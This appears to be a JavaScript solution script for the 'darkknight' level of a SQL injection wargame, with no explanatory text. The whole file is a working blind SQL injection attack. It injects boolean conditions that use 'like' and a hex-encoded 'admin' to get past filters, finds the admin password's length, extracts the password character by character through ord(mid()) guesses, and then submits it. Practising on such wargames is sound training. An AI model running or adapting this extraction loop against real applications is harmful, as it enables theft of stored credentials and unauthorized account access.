var password = '';
var length = 0;

(async function(){
    for(let i = 0; i < 100; i++){
        var result = ''
        await fetch(`https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no=0 or id like 0x61646d696e and length(pw) like ${i}%23`,{
                include: 'credentials'
            }
        ).then((x) => x.text()).then((x) => result = x);
        
        if(result.indexOf('<hr><br><h2>Hello admin</h2><code>') != -1){
            length = i;
            console.log(`[*] length : ${length}`);
            break
        }
    }

    for(let i = 0; i < length; i++){
        for(let j = 33; j < 128; j++){
            var result = ''
            await fetch(`https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no=0 or id like 0x61646d696e and ord(mid(pw, ${i+1},1)) like ${j}%23`,{
                    include: 'credentials'
                }
            ).then((x) => x.text()).then((x) => result = x);
            if(result.indexOf('<hr><br><h2>Hello admin</h2><code>') != -1){
                password += String.fromCharCode(j);
                break
            }
        }
    }
    console.log(`[*] password : ${password}`);

    fetch(`https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=${password}`, {
            include: 'credentials'
        }
    ).then((x) => x.text()).then((x) => console.log(x));
})();
